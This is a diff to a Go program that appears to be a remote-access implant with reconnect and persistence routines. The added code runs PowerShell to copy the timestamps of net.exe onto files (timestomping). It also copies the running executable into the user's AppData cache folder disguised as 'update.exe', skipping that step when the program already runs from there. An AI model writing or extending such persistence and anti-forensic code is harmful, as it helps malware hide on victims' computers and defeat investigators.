@@ -81,23 +81,33 @@ func reconnect() {
 	go main()
 }
 
+func ChangeFileCreationDate(file string) {
+	//(Get-Item C:\Users\meow\AppData\Local\cache).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
+	//(Get-Item C:\Users\meow\AppData\Local\cache).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime
+	Exec("powershell /c " + fmt.Sprintf(`
+	(Get-Item %s).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime 
+	&& (Get-Item %s).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime`,
+		file, file))
+}
+
 func persist() {
 	ex, err := os.Executable()
 	if err != nil {
 		panic(err)
 	}
 	fmt.Println(ex)
-	if strings.Contains(ex, "go-build") {
+	if strings.Contains(ex, "go-build") || strings.Contains(ex, "AppData") {
 		//this will stop this function from doing anything else
-		//if this program is run with "go run"
+		//1. if this program is run with "go run"
+		//2. if the program already exists in the appdata folder
 		return
 	}
 
-	//(Get-Item C:\Users\meow\AppData\Local\cache).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
-	//(Get-Item C:\Users\meow\AppData\Local\cache).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime
-
 	userCacheDir, _ := os.UserCacheDir()
 	programDir := path.Join(userCacheDir, "cache")
+	if !common.FileExists(programDir) {
+		os.Mkdir(programDir, 0644)
+	}
 	common.CopyFile(ex, path.Join(programDir, "update.exe"))
 }
 
